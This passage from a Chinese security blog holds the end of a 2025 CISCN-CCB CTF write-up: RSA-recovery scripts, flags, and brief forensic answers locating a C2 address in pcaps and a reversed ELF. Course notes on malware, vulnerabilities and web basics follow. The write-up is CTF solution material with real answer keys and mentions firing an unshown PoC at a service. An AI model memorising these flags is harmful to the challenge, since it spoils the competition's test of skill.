class="number">11618635355226290496294059660684603271588961451576288595852951276334806609033643787615488344507896857194047959998447214859969744967026400630924460267578943153410706528035442130937391499097216199001992180336450905339834216101657701141898474167790182212942369008350602241504906953057533358121870137756984024718626959548768270243611602403692209977991118081549322098177312841836591127963898605893447513836841527304670334168898249244877428516320988326935026436339811852851774767266645087443342058339001680095456544461819091726014417859396827670899885993279204262383019508480189625007076070194718973783400618991012898398971</span></span><br><span class="line">s=<span class="number">7547052520968274686361390354285315087014340779570155974910998576495561953587318079357069880644559171407046420462937990129522060964321221028493396033041599196464187957179980446173784787331698698561742332536751956414220040013365969434115189539462094772621278876850660929745673861325132019440705142779617380382511054084461569440985254700562753414759088555879937884688154445987875415437130349205506768368786816237719717004795323391266775205156239444277181913569391343776187901301703075697132319977481036429174361283683381079528630613358434337746208635554486300034455331087173311239089359066587253492149727949991752157130</span></span><br><span class="line"></span><br><span class="line">t = invert(s, n)</span><br><span class="line"></span><br><span class="line">p, q = symbols(<span class="string">"p, q"</span>, integer=<span class="literal">True</span>)</span><br><span class="line">solutions = solve([<span class="number">514</span>*p - <span class="number">114</span>*q - t, p*q - n])</span><br><span class="line">p = solutions[<span class="number">0</span>][p]</span><br><span class="line">q = solutions[<span class="number">0</span>][q]</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="comment">#107039821091476907017361040577100142080416506607330385914714896527723104434231991867446553926956088272494931767357910005226685224323888560118102752832821265121788585829575612779765001594434154517988820915969980410997090848817455330109147139014661903366930742269344732454435610621218450264594885489462013983987</span></span><br><span class="line"><span class="comment">#151677777799397230712001297032535496815539593864839536857494497889357845204973853077974576890314781663504855038646614281597509142082401258190873413836743927444104379591420166860126996505224123494050068333796017557802283729445202439509483655265818829771274657687534045119516831069023231285659118123116078992729</span></span><br></pre></td></tr></table></figure>
<p>然后解得d</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">p=<span class="number">107039821091476907017361040577100142080416506607330385914714896527723104434231991867446553926956088272494931767357910005226685224323888560118102752832821265121788585829575612779765001594434154517988820915969980410997090848817455330109147139014661903366930742269344732454435610621218450264594885489462013983987</span></span><br><span class="line">q=<span class="number">151677777799397230712001297032535496815539593864839536857494497889357845204973853077974576890314781663504855038646614281597509142082401258190873413836743927444104379591420166860126996505224123494050068333796017557802283729445202439509483655265818829771274657687534045119516831069023231285659118123116078992729</span></span><br><span class="line">d = invert(<span class="number">65537</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#6109052349547257206697096233914872260989327686702877341357297374235483700898764426663731614354637333081857960824673503479028836612555987493725239652501170165553073731910636074799821398102203737540323068021873603013735631382159022431926454967088532329203130000441080435575597765980092908983838908398907972784232273234118645498740450016498454462799191401029143802550110050596585913392562268596838785215043032391431672670233571868072460160423058850272542871308182251910122824582051543573456850142342031440175701154950554859876416850016770939690923082085654825466912802560496063162148070829301504935160652899585466110913</span></span><br></pre></td></tr></table></figure>
<p>最终：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">16235562199200267459663730571049431604560323138825891010565012084966378560657028557593713658149224124014019674718841338098341965331592933997415694692050656493911264929774020942179882196570321425270890223396169112762011033004564308723485972391649681397363565727449598074059933122020979277213051522292750681766691422016751120287403039252908062651404902039208868924707593108364706700085611092189177151362213092719343563439787881931506466123650653478905555329561874204870585566987658878227630910823854130181333087408403245083629898953751267545552289595198873283690722202122622106505732576237684209082112223769923295430523</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=<span class="number">6109052349547257206697096233914872260989327686702877341357297374235483700898764426663731614354637333081857960824673503479028836612555987493725239652501170165553073731910636074799821398102203737540323068021873603013735631382159022431926454967088532329203130000441080435575597765980092908983838908398907972784232273234118645498740450016498454462799191401029143802550110050596585913392562268596838785215043032391431672670233571868072460160423058850272542871308182251910122824582051543573456850142342031440175701154950554859876416850016770939690923082085654825466912802560496063162148070829301504935160652899585466110913</span></span><br><span class="line">c=<span class="number">11618635355226290496294059660684603271588961451576288595852951276334806609033643787615488344507896857194047959998447214859969744967026400630924460267578943153410706528035442130937391499097216199001992180336450905339834216101657701141898474167790182212942369008350602241504906953057533358121870137756984024718626959548768270243611602403692209977991118081549322098177312841836591127963898605893447513836841527304670334168898249244877428516320988326935026436339811852851774767266645087443342058339001680095456544461819091726014417859396827670899885993279204262383019508480189625007076070194718973783400618991012898398971</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b'4daa-b621-da2f37dc0435}'</span></span><br></pre></td></tr></table></figure>
<p>将两个部分合起来，就是最后的flag了</p>
<p>flag{7f33cdc8-da19-4daa-b621-da2f37dc0435}</p>
<h2 id="威胁检测与网络流量分析">威胁检测与网络流量分析</h2>
<h3 id="zeroshell_1">zeroshell_1</h3>
<p>打开附件的数据包</p>
<p><img src="/images/2025CISCN-CCB/33.png"></p>
<p>搜http可以直接找到一个关键的路径</p>
<p>跟踪数据包看一下</p>
<p><img src="/images/2025CISCN-CCB/34.png"></p>
<p>直接执行了命令</p>
<p>然后refer里面就是flag</p>
<p><img src="/images/2025CISCN-CCB/35.png"></p>
<h3 id="zeroshell_2">zeroshell_2</h3>
<p>拿poc直接打，然后搜索全部文件中包含flag的</p>
<p><img src="/images/2025CISCN-CCB/36.png"></p>
<p>可以搜到，然后直接cat</p>
<p><img src="/images/2025CISCN-CCB/37.png"></p>
<h3 id="zeroshell_3">zeroshell_3</h3>
<p>我们队伍先做的4，再做的3</p>
<p>根据队友传出来的文件，使用IDA查看这个文件，查看字符串，往下翻发现可疑ip和密码</p>
<p><img src="/images/2025CISCN-CCB/38.png"></p>
<p>查看该字符串存放位置，在根据调用链查看，该函数位于start，看起来也比较符合网络连接的代码。进行尝试，发现是正确的ip地址</p>
<p><img src="/images/2025CISCN-CCB/39.png"></p>
<h3 id="zeroshell_4">zeroshell_4</h3>
<p>猜测隐藏文件以.开头，直接搜</p>
<p><img src="/images/2025CISCN-CCB/40.png"></p>
<p>看到一个nginx文件很可疑</p>
<p>看到一个elf文件</p>
<p><img src="/images/2025CISCN-CCB/41.png"></p>
<p>下载提取其中的elf文件，然后发给逆向手，逆向手去做的3和5</p>
<p>最终4的flag就是flag{.nginx}</p>
<h3 id="zeroshell_5">zeroshell_5</h3>
<p>根据zeroshell_5解答正确，根据队友传出来的文件，使用IDA查看这个文件，查看字符串，往下翻发现可疑ip和密码</p>
<p><img src="/images/2025CISCN-CCB/42.png"></p>
<p>查看该字符串存放位置，在根据调用链查看，该函数位于start，看起来也比较符合网络连接的代码。同时这个密钥也在ip下方，进行尝试，发现是正确的。</p>
<p><img src="/images/2025CISCN-CCB/43.png"></p>
<h3 id="winft_1">WinFT_1</h3>
<p>打开主机，桌面有一个currports程序，我们打开，下面有一个正在运行的exe程序</p>
<p><img src="/images/2025CISCN-CCB/44.png"></p>
<p>双击这个程序</p>
<p><img src="/images/2025CISCN-CCB/45.png"></p>
<p>flag{miscsecure.com:192.168.116.130:443}</p>
<h3 id="winft_2">WinFT_2</h3>
<p>打开PCHunter程序，进入电脑体检中</p>
<p>选择启动信息，生成检测报告，最后一行有一个奇怪的命令，里面有flag</p>
<p><img src="/images/2025CISCN-CCB/46.png"></p>
<p>导出报告，cyberchef直接梭</p>
<p><img src="/images/2025CISCN-CCB/477.png"></p>
<p>得到flag</p>
<h3 id="sc05_1">sc05_1</h3>
<p>告警IP为134.6.4.12（简称IP1），然后问我们IP1地址首次被请求时间是多久？</p>
<p>所以我们直接在firewall的excel中查找该ip地址</p>
<p>首先在http-export中搜索该ip</p>
<p><img src="/images/2025CISCN-CCB/47.png"></p>
<p>然后将2024/11/09_16:23:57 MD5加密，上交flag，发现错误</p>
<p>然后再去第二个表中查找，发现找不到</p>
<p>然后在tcp-export中进行查找</p>
<p><img src="/images/2025CISCN-CCB/48.png"></p>
<p>发现找到了两个ip地址，一个一个试</p>
<p>发现2024/11/09_16:22:42这个时间，MD5加密得到flag，就对了</p>
<p>得到flag{01DF5BC2388E287D4CC8F11EA4D31929}</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2024/11/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2024/11/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/" itemprop="url">数据结构笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-11-05T11:07:43+08:00">
                2024-11-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">课程笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2024/11/05/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2024/11/05/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/" itemprop="url">嵌入式系统笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-11-05T11:07:36+08:00">
                2024-11-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">课程笔记</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index">
                    <span itemprop="name">嵌入式系统</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter1/" itemprop="url">软件安全笔记Chapter1</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-11-05T11:07:23+08:00">
                2024-11-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">课程笔记</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">软件安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="第一章-基本概念">第一章 基本概念</h1>
<h2 id="病毒和木马">病毒和木马</h2>
<p>​ 病毒、蠕虫和木马三者都对电脑有一定的危害，但是三者有其不同之处。</p>
<h3 id="病毒">病毒</h3>
<p>​
指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码</p>
<p>​
往往具有很强的<strong>感染性、潜伏性、破坏性、特定的触发性</strong></p>
<p>​
病毒必须满足两个条件，<strong>自我执行</strong>（它通常将自己的代码置于另一个程序的执行路径中）、<strong>自我复制</strong>（它可能用受病毒感染的文件副本替换其他可执行文件）</p>
<h3 id="蠕虫">蠕虫</h3>
<p>​
利用网络进行复制和传播，是自身包含的程序，通过网络连接，能够将自身功能拷贝到其他计算机中</p>
<p>​
普通病毒需要传播驻留文件（受感染的）来进行复制，但是蠕虫<strong>不需要驻留文件就可以在系统之间进行复制</strong>，蠕虫病毒的传染目标是互联网所有的计算机</p>
<h3 id="木马">木马</h3>
<p>​
是表面上有用的软件、实际目的却是危害计算机安全并导致严重破坏的计算机程序，具有非<strong>授权性、隐蔽性</strong>，是一种<strong>远程控制</strong>的黑客工具</p>
<p>​
木马<strong>不具有传染性</strong>，不能像病毒那样复制自身，是将自身伪装起来，让用户下载执行，主要目的是窃取用户相关的信息或者隐蔽性控制，就是说<strong>病毒是破坏你的信息，木马窥视你</strong></p>
<h2 id="软件漏洞">软件漏洞</h2>
<p>分清楚<strong>软件缺陷&amp;软件漏洞</strong>：</p>
<p>​
软件缺陷是，导致程序不能运行；软件漏洞不是bug，而是一个安全上的漏洞</p>
<p><strong>电脑肉鸡：</strong></p>
<p>​
就是说，自己的电脑被别人远程控制了，攻击者通过寻找漏洞来主动控制电脑，植入木马</p>
<p><strong>漏洞分类：</strong></p>
<ul>
<li>0day漏洞：还处于未公开状态的漏洞。这类漏洞只在攻击者个人或者小范围黑客团体内使用，网络用户和厂商都不知情，因此没有任何防范手段，危害非常大，</li>
<li>1day漏洞：补丁发布在1天内的漏洞，通常指发布补丁时间不长的漏洞，仍然存在一定的危害</li>
<li>已公开漏洞：厂商已经发布了补丁和修补方法，危害比较小</li>
</ul>
<p><strong>漏洞产业链：</strong></p>
<p>​
上游（技术开发部门，编写恶意软件）、中游（执行产业部门，实现病毒的传播，网络攻击）、下游（销赃产业部门，贩卖木马、病毒等）</p>
<h2 id="漏洞库">漏洞库</h2>
<p>国内外有许多的漏洞库，都是公开的</p>
<ul>
<li>CVE：<strong>通用漏洞列表</strong>，实现了安全漏洞命名机制的规范化和标准化，为每个漏洞确定了唯一的名称和标准化的描述</li>
<li>NVD：<strong>美国国家漏洞数据库</strong>，同时收录三个漏洞数据库的信息，CVE漏洞公告、US-CERT漏洞公告、US-CERT安全警告</li>
<li>CNNVD：<strong>中国国家信息安全漏洞库</strong>，是国内的数据库</li>
<li>CNVD：<strong>国家信息安全漏洞共享平台</strong></li>
<li>其他漏洞库，如EDB漏洞库等</li>
</ul>
<h2 id="渗透测试">渗透测试</h2>
<p>​
渗透测试是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。</p>
<p>​ 渗透测试是一个渐进的过程，不影响业务系统的正常运行。</p>
<p><strong>渗透测试方法</strong></p>
<ul>
<li>黑箱测试：对系统一无所知的状态下，进行测试</li>
<li>白盒测试：测试者可以通过正常渠道向被测单位取得各种资料</li>
<li>隐秘测试：接受渗透测试的单位网络管理部门会收到通知，在某些时段进行测试。因此能够监测网络中出现的变化</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter10/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter10/" itemprop="url">软件安全笔记Chapter10</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-11-05T11:07:23+08:00">
                2024-11-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">课程笔记</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">软件安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="第十章-web安全基础">第十章 WEB安全基础</h1>
<h2 id="web基础">WEB基础</h2>
<p>HTTP协议：超文本传输协议</p>
<p>统一资源标示符：URL</p>
<p>HTTP协议采用了<strong>请求/响应</strong>模型。</p>
<p>HTML：超文本标记语言</p>
<ul>
<li>Head：头 关于网页的信息</li>
<li>body：主体 关于网页的具体内容</li>
</ul>
<p><strong>标记一般都是成对的出现的，&lt;html&gt;为我们的开头，然后&lt;/html&gt;就是我们的结尾</strong></p>
<p>（部分标记除外例如：&lt;br/&gt;）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这2个标记符分别表示头部信息的开始和结尾。<strong>头部中包含的标记是页面的标题、序言、说明等内容，它本身不作为内容来显示，但影响网页显示的效果</strong>。头部中最常用的标记符是标题标记符和meta标记符，其中<strong>标题标记符用于定义网页的标题，它的内容显示在网页窗口的标题栏中</strong>，网页标题可被浏览器用作书签和收藏清单。</p>
<p>JavaScript：是一种嵌入在我们的html语言中的脚本语言，可以提供动态功能</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript简单示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">                     <span class="title function_">alert</span>(<span class="string">&quot;第一个javascript&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">               </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </span><br><span class="line">         <span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>有它自身的<strong>基本数据类型，表达式和算术运算符及程序的基本程序框架</strong></p>
<h2 id="web编程环境">WEB编程环境</h2>
<p>WEB静态语言和WEB动态语言</p>
<ul>
<li>WEB静态语言就是通常所见到的超文本标记语言（标准通用标记语言下的一个应用）</li>
<li>WEB动态语言主要是ASP、PHP、JAVASCRIPT、JAVA、CGI等计算机脚本语言编写出来的执行灵活的互联网网页程序。</li>
</ul>
<h2 id="php语言">PHP语言</h2>
<p>PHP:</p>
<ul>
<li>是一种<strong>解释性语言</strong>。PHP的语法和C/C++，Java，Perl，ASP，JSP有相通之处并且加上了自己的语法。</li>
<li>由于PHP是一种<strong>面向HTML的解析语言</strong>，所以，PHP语句被包含在PHP标记里面，PHP标记外的语句都被直接输出。包括在PHP标记中的语句被解析，在其外的语句原样输出并且接受PHP语句的控制</li>
</ul>
<p><img
src="/images/软件安全/image-20240528163300208-1718849461066-1.png" /></p>
<p>变量解析当遇到符号（$）时产生，<strong>解析器会尽可能多地取得后面的字符以组成一个合法的变量名，然后将变量值替换他们</strong>，如果$后面没有有效的变量名，则输出"$"<strong>。如果想明确的变量名可以用花括号把变量名括起来</strong>。</p>
<h2 id="http会话管理">HTTP会话管理</h2>
<p>HTTP协议属于<strong>无状态的通信协议</strong></p>
<p>当浏览器发送请求给服务器的时候，服务器响应，但是当同一个浏览器再发送请求给服务器的时候，他不知道你就是刚才那个浏览器。简单地说，就是服务器不会去记得你</p>
<p><strong>HTTP是短连接的</strong></p>
<p>为了识别不同的请求是否来自同一客户，需要引用HTTP会话机制：</p>
<p><strong>多次HTTP连接间维护用户与同一用户发出的不同请求之间关联的情况称为维护一个会话（session）。</strong></p>
<p><strong>Cookie与session</strong>是与HTTP会话相关的两个内容，其中<strong>Cookie存在在浏览器，session存储在服务器中</strong></p>
<p><strong>Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器</strong></p>
<ul>
<li>正统的cookie分发是通过扩展HTTP协议来实现的，服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie。</li>
<li>浏览器检查所有存储的cookie，如果某个cookie所声明的作用范围大于等于将要请求的资源所在的位置，则把该cookie附在请求资源的HTTP请求头上发送给服务器。</li>
</ul>
<p>cookies的内容：<strong>名字，值，过期时间，路径和域</strong></p>
<p>若不设置过期时间，则表示<strong>这个cookie的生命期为浏览器会话期间</strong>，关闭浏览器窗口，cookie就消失。这种生命期为浏览器会话期的cookie被称为<strong>会话cookie</strong>。</p>
<p>会话cookie一般不存储在硬盘上而是保存在内存里</p>
<ul>
<li>若设置了过期时间，浏览器就会把cookie保存到硬盘上</li>
<li>存储在硬盘上的cookie可以在不同的浏览器进程间共享，比如两个IE窗口</li>
</ul>
<p><strong>session
id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串</strong></p>
<h2 id="http请求">HTTP请求</h2>
<p>method属性指定了与服务器进行信息交互的方法为POST。</p>
<p>交互的四种方法：</p>
<ul>
<li>GET：GET一般用于获取/查询资源信息</li>
<li>POST：而POST一般用于更新资源信息</li>
<li>DELETE</li>
<li>PUT</li>
</ul>
<p>以?分割URL和传输数据，参数之间以&amp;相连，如：<code>login.action?name=sean&amp;password=123</code></p>
<ul>
<li>GET请求的数据会附在URL之后</li>
<li>POST把提交的数据则放置在是HTTP包的包体中</li>
</ul>
<p><strong>POST的安全性要比GET的安全性高：</strong></p>
<ul>
<li>GET模式下，通过URL就可以作数据修改</li>
<li>GET模式下，用户名和密码将明文出现在URL上，因为登录页面有可能被浏览器缓存、其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了</li>
<li>GET模式下，提交数据还可能会造成跨站请求伪造攻击</li>
</ul>
<h2 id="php连接数据库">PHP连接数据库</h2>
<p>表userinfo：有两个字段</p>
<ul>
<li>username</li>
<li>pwd</li>
</ul>
<p>数据库应用开发三步骤：</p>
<ul>
<li><p>连接数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$conn<span class="operator">=</span>mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;);</span><br></pre></td></tr></table></figure></li>
<li><p>执行SQL操作</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_db_query(&quot;MyDB&quot;, $SQLStr, $conn);</span><br></pre></td></tr></table></figure></li>
<li><p>关闭连接</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_free_result($<span class="keyword">result</span>); mysql_close($conn); </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="cookie实战">Cookie实战</h2>
<p>cookie和session的关系：</p>
<ul>
<li>共性：都可以暂时保存在多个页面中使用的变量。</li>
<li>区别：cookie存放在客户端浏览器，session保存在服务器。它们之间的联系是session
ID一般保存在cookie中，来实现HTTP会话管理</li>
</ul>
<p>工作原理：</p>
<ul>
<li>生成Cookie：当客户访问某网站时，PHP可以使用setcookie函数告诉浏览器生成一个cookie，并把这个cookie保存在c:and
Settings。</li>
<li>使用Cookie：Cookie是HTTP标头的一部分，当客户再次访问该网站时，浏览器会自动把与该站点对应的cookie发送到服务器，服务器则把从客户端传来的cookie将自动地转化成一个PHP变量。</li>
</ul>
<p><strong>setcookie格式</strong></p>
<ul>
<li>setcookie(name, value, expire, path, domain, secure)</li>
